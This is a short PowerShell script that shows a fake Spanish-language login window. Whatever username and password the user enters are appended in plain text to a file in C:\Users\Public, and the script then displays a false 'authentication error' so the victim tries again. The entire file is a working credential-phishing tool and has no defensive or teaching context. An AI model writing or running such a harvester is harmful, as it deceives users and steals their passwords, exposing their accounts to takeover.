Add-Type -AssemblyName System.Windows.Forms

$form = New-Object System.Windows.Forms.Form
$form.Text = "Inicio de Sesión"
$form.Width = 300
$form.Height = 200

$labelUser = New-Object System.Windows.Forms.Label
$labelUser.Text = "Usuario:"
$labelUser.Top = 20
$labelUser.Left = 10
$form.Controls.Add($labelUser)

$textUser = New-Object System.Windows.Forms.TextBox
$textUser.Top = 40
$textUser.Left = 10
$textUser.Width = 260
$form.Controls.Add($textUser)

$labelPass = New-Object System.Windows.Forms.Label
$labelPass.Text = "Contraseña:"
$labelPass.Top = 70
$labelPass.Left = 10
$form.Controls.Add($labelPass)

$textPass = New-Object System.Windows.Forms.TextBox
$textPass.Top = 90
$textPass.Left = 10
$textPass.Width = 260
$textPass.UseSystemPasswordChar = $true
$form.Controls.Add($textPass)

$button = New-Object System.Windows.Forms.Button
$button.Text = "Login"
$button.Top = 130
$button.Left = 10
$button.Add_Click({
    $data = "Usuario: $($textUser.Text) - Contraseña: $($textPass.Text)"
    Add-Content -Path "C:\Users\Public\logindata.txt" -Value $data
    [System.Windows.Forms.MessageBox]::Show("Error de autenticación. Intente nuevamente.")
})
$form.Controls.Add($button)

$form.Topmost = $true
$form.ShowDialog()